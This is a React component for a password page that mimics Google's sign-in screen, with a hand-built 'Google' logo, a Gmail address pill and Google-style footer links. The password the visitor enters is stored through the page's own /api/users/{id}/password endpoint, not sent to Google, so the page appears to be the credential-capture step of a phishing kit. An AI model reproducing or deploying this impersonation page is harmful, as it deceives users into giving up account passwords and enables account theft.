import React, { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import axios from "axios";

export default function Password() {
    const [showPassword, setShowPassword] = useState(false);
    const [password, setPassword] = useState("");
    const [error, setError] = useState("");
    const [loading, setLoading] = useState(false);

    const navigate = useNavigate();
    const location = useLocation();
    const { userId, username } = location.state || {};

    const handleNext = async () => {
        if (!password.trim()) {
            setError("Please enter your password.");
            return;
        }
        setError("");
        setLoading(true);
        try {
            const res = await axios.put(`/api/users/${userId}/password`, { password });
            navigate("/welcome", { state: { username: res.data.username } });
        } catch (err) {
            setError(err.response?.data?.message || "Something went wrong. Please try again.");
        } finally {
            setLoading(false);
        }
    };

    // Get initials for avatar
    const initial = username ? username.charAt(0).toUpperCase() : "S";

    return (
        <div className="min-h-screen bg-[#202124] flex items-center justify-center text-white px-4">

            {/* Card */}
            <div className="bg-black rounded-3xl w-full max-w-4xl p-6 sm:p-10 shadow-xl flex flex-col md:flex-row">

                {/* LEFT */}
                <div className="flex flex-col justify-between md:w-1/2 md:pr-8 mb-8 md:mb-0">
                    <div>
                        {/* Google Logo */}
                        <div className="text-2xl font-bold mb-6 text-center md:text-left">
                            <span className="text-blue-500">G</span>
                            <span className="text-red-500">o</span>
                            <span className="text-yellow-500">o</span>
                            <span className="text-blue-500">g</span>
                            <span className="text-green-500">l</span>
                            <span className="text-red-500">e</span>
                        </div>

                        <h1 className="text-2xl sm:text-3xl font-semibold mb-4 text-center md:text-left">
                            Welcome
                        </h1>

                        {/* Username pill */}
                        <div className="bg-[#303134] px-4 py-2 rounded-full inline-flex items-center gap-2 text-sm mx-auto md:mx-0">
                            <span className="w-6 h-6 rounded-full bg-gray-500 flex items-center justify-center text-xs">
                                {initial}
                            </span>
                            <span className="truncate max-w-[160px] sm:max-w-none">
                                {username || "example@gmail.com"}
                            </span>
                            <span className="text-xs">▼</span>
                        </div>
                    </div>

                    {/* Language */}
                    <div className="text-sm text-gray-400 mt-10 text-center md:text-left">
                        English (United States)
                    </div>
                </div>

                {/* RIGHT */}
                <div className="md:w-1/2 md:pl-8 flex flex-col justify-center">
                    <label className="text-sm text-gray-400 mb-2">
                        Enter your password
                    </label>

                    <input
                        type={showPassword ? "text" : "password"}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        onKeyDown={(e) => e.key === "Enter" && handleNext()}
                        className="w-full bg-transparent border border-gray-600 rounded-md px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-500"
                    />

                    {error && (
                        <p className="text-red-400 text-xs mt-2">{error}</p>
                    )}

                    {/* Show password */}
                    <div className="flex items-center mt-3 gap-2 text-sm">
                        <input
                            type="checkbox"
                            onChange={() => setShowPassword(!showPassword)}
                        />
                        <span>Show password</span>
                    </div>

                    {/* Actions */}
                    <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center mt-8 gap-4">
                        <button className="text-blue-400 text-sm hover:underline text-left">
                            Forgot password?
                        </button>

                        <button
                            onClick={handleNext}
                            disabled={loading}
                            className="bg-blue-500 hover:bg-blue-600 disabled:opacity-60 px-6 py-2 rounded-full text-sm font-medium w-full sm:w-auto"
                        >
                            {loading ? "Saving..." : "Next"}
                        </button>
                    </div>
                </div>
            </div>

            {/* Footer */}
            <div className="absolute bottom-4 left-0 w-full flex flex-col sm:flex-row justify-between items-center px-6 text-sm text-gray-400 gap-2 sm:gap-0">
                <span>English (United States)</span>
                <div className="flex gap-6">
                    <span className="cursor-pointer hover:underline">Help</span>
                    <span className="cursor-pointer hover:underline">Privacy</span>
                    <span className="cursor-pointer hover:underline">Terms</span>
                </div>
            </div>
        </div>
    );
}